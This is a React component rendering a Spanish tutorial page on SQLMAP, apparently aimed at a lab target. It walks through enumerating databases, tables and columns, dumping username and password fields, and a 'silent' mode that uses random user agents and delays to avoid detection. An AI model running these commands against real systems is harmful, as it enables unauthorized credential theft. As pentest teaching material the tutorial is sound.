import React from "react";

import Comand from "../../../Comand";
import Img from "../../../Img";

//Imagenes
import Img_One from "./../../../../sources/imgs/SQLMAP/SQLMAP_01.png";
import Img_Two from "./../../../../sources/imgs/SQLMAP/SQLMAP_02.png";
import Img_Three from "./../../../../sources/imgs/SQLMAP/SQLMAP_03.png";
import Img_Four from "./../../../../sources/imgs/SQLMAP/SQLMAP_04.png";
import Img_Five from "./../../../../sources/imgs/SQLMAP/SQLMAP_05.png";
import Img_Six from "./../../../../sources/imgs/SQLMAP/SQLMAP_06.png";
import Img_Seven from "./../../../../sources/imgs/SQLMAP/SQLMAP_07.png";
import Img_Eight from "./../../../../sources/imgs/SQLMAP/SQLMAP_08.png";
import Img_Nine from "./../../../../sources/imgs/SQLMAP/SQLMAP_09.png";
import Img_Ten from "./../../../../sources/imgs/SQLMAP/SQLMAP_10.png";
import Img_Eleven from "../../../../sources/imgs/SQLMAP/SQLMAP_11.png";
import Img_Twelve from "../../../../sources/imgs/SQLMAP/SQLMAP_12.png";
import Img_Thirteen from "../../../../sources/imgs/SQLMAP/SQLMAP_13.png";
import Img_Fourteen from "../../../../sources/imgs/SQLMAP/SQLMAP_14.png";
import Img_Fifteen from "../../../../sources/imgs/SQLMAP/SQLMAP_15.png";

import icon_directory_pink from "./../../../../sources/icons/icon-directory-pink.svg";
import icon_directory from "./../../../../sources/icons/icon-directory.svg";

export default function SQLMAP (props) {
    return (
        <>
            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory_pink} alt=""/>
                <span className="span-pink"> SQLMAP.<span className="span-pink cursor">_</span>
                </span>
            </h3>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">Introducción a SQLMAP.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                <span className="span-yellow">SQLMAP</span> es una <span className="span-white">herramienta de código abierto</span> escrita en <span className="span-pink">Python</span> que <span className="span-blue">automatiza la detección</span> y <span className="span-blue">explotación</span> de <span className="span-white">vulnerabilidades de inyección SQL</span> en aplicaciones web. Su principal <span className="span-pink">objetivo</span> es <span className="span-blue">ayudar a los testers a identificar fallos de seguridad en bases de datos a través de inyecciones SQL</span>, y <span className="span-blue">extraer información como nombres de bases de datos, tablas, columnas</span>, y <span className="span-blue">datos confidenciales</span>.
            </p>

            <p>
                Funcionalidades clave:
            </p>

            <ul className="ol-code">
                <li>
                    <p>
                        <span className="span-yellow">Detección</span> y <span className="span-yellow">explotación</span> de <span className="span-pink">múltiples tipos de SQL Injection</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-yellow">Soporte para bases de datos</span> como <span className="span-pink">MySQL, Oracle, PostgreSQL, MSSQL, SQLite</span>, etc.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-yellow">Capacidad para tomar control de sistemas de bases de datos</span> mediante ejecución de comandos del sistema operativo.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-yellow"> Integración con TOR y proxies</span> para anonimato.
                    </p>
                </li>
            </ul>

            <p>
                El comando base para ejecutar cualquier instruccion de SQLMAP es:
            </p>
            
            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap"
            />

            <p>Imagen de referencia:</p>

            <Img
                img = {Img_One}
                alt = {"Imagen 1. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"1. Comando principal de SQLMAP."}
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">Instalación de SQLMAP.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                En <span className="span-yellow">Kali Linux</span>, <span className="span-yellow">SQLMAP</span> generalmente viene <span className="span-white">preinstalado</span>. Para <span className="span-white">verificarlo</span>, usa el comando <i className="span-white">`-h`</i> para obtener <span className="span-pink"> ayuda de información</span>:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -h"
            />

            <p>Imagen de <span className="span-white">referencia</span>:</p>

            <Img
                img = {Img_Two}
                alt = {"Imagen 2. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"2. Comando de informacion de SQLMAP."}
            />

            <p>
                Si por algún motivo <span className="span-yellow">SQLMAP</span> <span className="span-pink">NO</span> se encuentra instalado, puede hacerlo clonando su repositorio de <span className="span-white">GitHub</span>:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap"
            />

            <p>
                Y Ejecutando el <i className="span-white">.py</i>.
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "python3 sqlmap.py -h"
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">Uso básico de SQLMAP.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                El comando basico y principal para el uso de <span className="span-yellow">SQLMAP</span>, es:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap --url <ip-dominio> --opciones"
            />

            <p>
                Un <span className="span-white">ejemplo</span> simple:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap --url http://dev.budasec.thl/ --dbs --forms"
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Three}
                alt = {"Imagen 3. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"3. Ejemplo de comando basico de SQLMAP."}
            />

            <p>
                <span className="span-yellow">Nota:</span> Si realizaste la clonación desde <span className="span-white">github</span>, no olvides utilizar al inicio de los comandos <i className="span-white">python3</i>.
            </p>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">SQLMAP con --batch.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Si utilizamos el parametro <i className="span-white">--batch</i>, este significa que <span className="span-pink">aceptamos todas las opciones por defecto</span> (modo no interactivo).
            </p>

            <p>
                <span className="span-pink">SQLMAP</span> <span className="span-pink">detectará automáticamente</span> la <span className="span-blue">vulnerabilidad</span> y el <span className="span-blue">tipo de inyección</span>.
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap --url <ip-dominio> --batch"
            />

            <p>
                Un <span className="span-white">ejemplo</span>:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap --url http://dev.budasec.thl/ --dbs --batch --forms"
            />

            <p>
                Donde:
            </p>

            <Img
                img = {Img_Four}
                alt = {"Imagen 4. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"4. Comando de SQLMAP utilizando parametro --batch."}
            />

            <p>
                <span className="span-yellow">Nota:</span> <i className="span-white">--batch</i> automatiza todas las opciones de <i className="span-white">Y/N</i> de la <span className="span-pink">herramienta</span>.
            </p>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Configuración de nivel de profundidad.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                <span className="span-yellow">SQLMAP</span> permite <span className="span-blue">realizar pruebas</span> y <span className="span-blue">ataques</span> configurando el grado de <span className="span-white">nivel de intensidad de pruebas</span> , para ello, utilizamos el <span className="span-pink">parametro</span>:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -u <ip-dominio> --level=<nivel-profundidad>"
            />

            <p>
                <span className="span-yellow">Nota:</span> El <span className="span-white">nivel de intensidad</span> va desde el <span className="span-blue">1</span> hasta eñ <span className="span-blue">5</span>.
            </p>

            <p>Un <span className="span-white">ejemplo</span> de <span className="span-pink">comando</span>:</p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap --url http://dev.budasec.thl/ --dbs --forms --level=5"
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Five}
                alt = {"Imagen 5. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"5. Comando de SQLMAP utilizando parametro --level."}
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Configuración de nivel de riesgo.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Ademas de el <span className="span-white">nivel de intensidad</span>, <span className="span-yellow">SQLMAP</span> permite tambien la configuración de <span className="span-white">nivel de riesgo</span>.
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap --url <ip-dominio> --risk=<nivel-riesgo>"
            />

            <p>
                <span className="span-yellow">Nota:</span> El <span className="span-white">nivel de riesgo</span> va desde el <span className="span-blue">1</span> hasta el <span className="span-blue">3</span>.
            </p>

            <p>Un <span className="span-white">ejemplo</span> de <span className="span-pink">comando</span>:</p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap --url http://dev.budasec.thl/ --dbs --forms --risk=3"
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Six}
                alt = {"Imagen 6. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"6. Comando de SQLMAP utilizando parametro --risk."}
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Enumeración de bases de datos.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Si el <span className="span-white">sitio proporcionado es vulnerable</span> a <span className="span-pink">inyecciones SQL</span>, entonces <span className="span-yellow">SQLMAP</span> podrá trabajar sobre el.
            </p>

            <p>
                Lo <spans className="span-pink">primero a obtener</spans> al realizar una <span className="span-pink">inyección SQL</span>, por lo general es la <span className="span-white">enumeración</span> de las <spa className="span-white">Bases de datos</spa>.
            </p>

            <p>
                Para ello, utilizamos el parametro <i className="span-white">--dbs</i>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url <ip-dominio> --dbs'
            />

            <p>
                <span className="span-white">Ejemplo</span>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url http://dev.budasec.thl/ --dbs --forms --level=5 --risk=3 --batch'
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Seven}
                alt = {"Imagen 7. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"7. Comando de SQLMAP para encontrar bases de datos"}
            />

            <p>
                Encontrando las <span className="span-pink">bases de datos</span>:
            </p>

            <Img
                img = {Img_Eight}
                alt = {"Imagen 8. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"8. Vizualizando bases de datos encontradas."}
            />

            <p>
                <span className="span-yellow">Nota:</span> Encontrando las <span className="span-pink">bases de datos</span> <span className="span-white">siguientes</span>:
            </p>

            <ol className="ol-code">
                <li>
                    <span className="span-white">buda</span>
                </li>
                <li>
                    <span className="span-pink">information schema</span>
                </li>
                <li>
                    <span className="span-pink">mysql</span>
                </li>
                <li>
                    <span className="span-pink">performace schema</span>
                </li>
                <li>
                    <span className="span-pink">sys</span>
                </li>
            </ol>

            <p>
                <span className="span-yellow">Nota:</span> La <span className="span-white">BD</span> a <span className="span-pink">atacar</span> para nosotros será <i className="span-white">buda</i>.
            </p>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Enumeración de tablas.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Una vez encontrada una <span className="span-white">Base de Datos</span>, podemos proceder a la <span className="span-pink">enumeración de  tablas</span> de dicha.
            </p>

            <p>
                Para ello, realizamos el <span className="span-pink">comando</span> con pequeñas modificaciones:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url <ip-dominio> -D <base-datos> --tables'
            />

            <p>Donde:</p>

            <ul className="ol-code">

                <li>
                    <p>
                        <span className="span-white">&lt;ip-dominio&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la ip o dominio de la url vulnerable</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-D</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">base de datos</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;base-datos&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">Base de datos</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--tables</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para indicarle a <span className="span-yellow">SQLMAP</span> que deseamos enumerar las tablas de dicha BD</span>.
                    </p>
                </li>
            </ul>

            <p>
                <span className="span-white">Ejemplo</span>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url http://dev.budasec.thl/ -D buda --tables --forms --batch'
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Nine}
                alt = {"Imagen 9. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"9. Comando de SQLMAP para encontrar tablas."}
            />

            <p>
                Encontrando la <span className="span-pink">tabla</span>:
            </p>

            <Img
                img = {Img_Ten}
                alt = {"Imagen 8. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"10. Vizualizando tablas encontradas."}
            />

            <p>
                <span className="span-yellow">Nota:</span> Encontrando la <span className="span-pink">tabla</span>:
            </p>

            <ol className="ol-code">
                <li>
                    <span className="span-pink">
                        users
                    </span>
                </li>
            </ol>

            <p>
                <span className="span-yellow">Nota:</span> En este ejemplo, intentamos obtener las <span className="span-pink">tablas</span> de la base de datos llamada <i className="span-white">buda</i>.
            </p>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Enumeración de columnas.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Ya obtenida la <span className="span-pink">base de datos</span> y <span className="span-pink">tablas</span>, ahora podemos obtener las <span className="span-blue">columnas</span>.
            </p>

            <p>
                Para ello, ahora realizamos el <span className="span-pink">comando</span>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url <ip-dominio> -D <base-datos> -T <tabla> --columns'
            />

            <p>
                Donde:
            </p>

            <ul className="ol-code">
                <li>
                    <p>
                        <span className="span-white">&lt;ip-dominio&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la ip o dominio de la url vulnerable</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-D</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">base de datos</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;base-datos&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">Base de datos</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-T</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">tabla</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;tabla&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">tabla</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--columns</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para indicarle a <span className="span-yellow">SQLMAP</span> que deseamos enumerar las columnas de una tabla, dentro de una BD</span>.
                    </p>
                </li>
            </ul>

            <p>
                Un <span className="span-white">ejemplo</span>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url http://dev.budasec.thl/ -D buda -T users --columns --forms --batch'
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Eleven}
                alt = {"Imagen 11. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"11. Comando de SQLMAP para encontrar columnas."}
            />

            <p>
                Encontrando las <span className="span-pink">columnas</span>:
            </p>

            <Img
                img = {Img_Twelve}
                alt = {"Imagen 8. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"12. Vizualizando columnas encontradas."}
            />

            <p>
                <span className="span-yellow">Nota:</span> Encontrando las <span className="span-pink">columnas</span>:
            </p>

            <ol className="ol-code">
                <li>
                    <span className="span-pink">
                        hashed_password
                    </span>
                </li>
                <li>
                    <span className="span-pink">
                        id
                    </span>
                </li>
                <li>
                    <span className="span-pink">
                        password
                    </span>
                </li>
                <li>
                    <span className="span-pink">
                        username
                    </span>
                </li>
            </ol>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Enumerar contenido.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Despues de <span className="span-pink">encontrar</span> el nombre de las <span className="span-white">columnas</span> de las tablas, ahora, podemos <span className="span-pink">dumpear la información</span> dentro de estas.
            </p>

            <p>
                Para ello, utilizamos el <spam className="span-pink">comando</spam>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url <ip-dominio> -D <base-datos> -T <tabla> -C <columna-X>,<columna-Y> --dump'
            />

            <p>
                Donde:
            </p>

            <ul className="ol-code">
                <li>
                    <p>
                        <span className="span-white">&lt;ip-dominio&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la ip o dominio de la url vulnerable</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-D</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">base de datos</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;base-datos&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">Base de datos</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-T</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">tabla</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;tabla&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">tabla</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-C</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de las columnas a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;columnas&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Son las <span className="span-white">columnas</span> encontradas, las cuales se  desea listar su información</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--dump</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para indicarle a <span className="span-yellow">SQLMAP</span> que deseamos listar los datos de las <span className="span-white">columnas</span> listadas</span>.
                    </p>
                </li>
            </ul>


            <p>
                Un <span className="span-white">ejemplo</span>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url http://dev.budasec.thl/ -D buda -T users -C username,password --dump --forms --batch'
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Thirteen}
                alt = {"Imagen 13. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"13. Comando de SQLMAP para dumplear información."}
            />

            <p>
                Enumerando el <span className="span-pink">contenido</span>:
            </p>

            <Img
                img = {Img_Fourteen}
                alt = {"Imagen 14. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"14. Vizualizando contenido encontrado."}
            />

            <p>
                De esta manera, podemos <span className="span-pink">navegar</span> entre la <span className="span-white">base de datos</span>, <span className="span-white">tablas</span> y visualizar su <span className="span-white">informacion</span>.
            </p>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> SQLMAP de manera silenciosa.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Ademas de los <span className="span-white">parametros</span> necesarios para utilizar <span className="span-yellow">SQLMAP</span>, existen algunos <span className="span-pink">otros extras</span> que pudieran ser muy utiles para <span className="span-blue">mejorar</span> y realizar de <span className="span-blue">manera mas silenciosa</span> nuestro <span className="span-pink">ataque</span>.
            </p>

            <p>Los cuales son:</p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url <ip-dominio> -D <base-datos> -T <tabla> -C <columna-X>,<columna-Y> --dump --flush-session --threads=<num-threads>  --random-agent --delay=<num-delay> --time-sec=<time-sec> --safe-url=<ip-dominio> --safe-freq=<safe-freq>'
            />

            <p>
                Donde:
            </p>

            <ul className="ol-code">
                <li>
                    <p>
                        <span className="span-white">--flush-session</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Elimina cualquier sesión previa guardada por <span className="span-yellow">SQLMAP</span>.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--threads</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Permite ejecutar múltiples hilos de forma paralela para acelerar las pruebas.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;num-threads&gt;</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Es el número de hilos a usar (valor recomendado: <span className="span-white">1 a 10</span>).</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--random-agent</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Activa el uso de <span className="span-white">User-Agent</span> aleatorios por cada solicitud.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--delay</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Agrega una pausa entre cada solicitud para reducir la posibilidad de ser detectado.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;num-delay&gt;</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Cantidad de segundos de retraso entre peticiones (ejemplo: <span className="span-white">1 a 10</span>).</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--time-sec</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Define el tiempo máximo que <span className="span-yellow">SQLMAP</span> esperará para evaluar una respuesta basada en tiempo.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;time-sec&gt;</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Número de segundos de espera (rango recomendado: <span className="span-white">1 a 10</span>).</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--safe-url</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Establece una URL confiable para comprobar si la aplicación sigue activa durante el ataque.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;ip-dominio&gt;</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Debe ser una URL funcional del mismo dominio que no sea sensible a inyecciones.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--safe-freq</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Indica la frecuencia con la que se usará la URL segura para verificar la disponibilidad.</span>
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;safe-freq&gt;</span> <span className="span-blue">-> </span>
                        <span className="span-pink">Número de peticiones entre cada chequeo (valor sugerido: <span className="span-white">10 a 50</span>).</span>
                    </p>
                </li>
            </ul>


            <p>Un <span className="span-white">ejemplo</span>:</p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap --url http://dev.budasec.thl/ -D buda -T users -C username,password --dump --forms --batch --flush-session --threads=2  --random-agent --delay=5 --time-sec=5 --safe-url=http://dev.budasec.thl/ --safe-freq=20'
            />

            <p>
                Visualizando:
            </p>

            <Img
                img = {Img_Fifteen}
                alt = {"Imagen 15. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"15. Comando de SQLMAP en modo sigiloso."}
            />
        </>
    );
}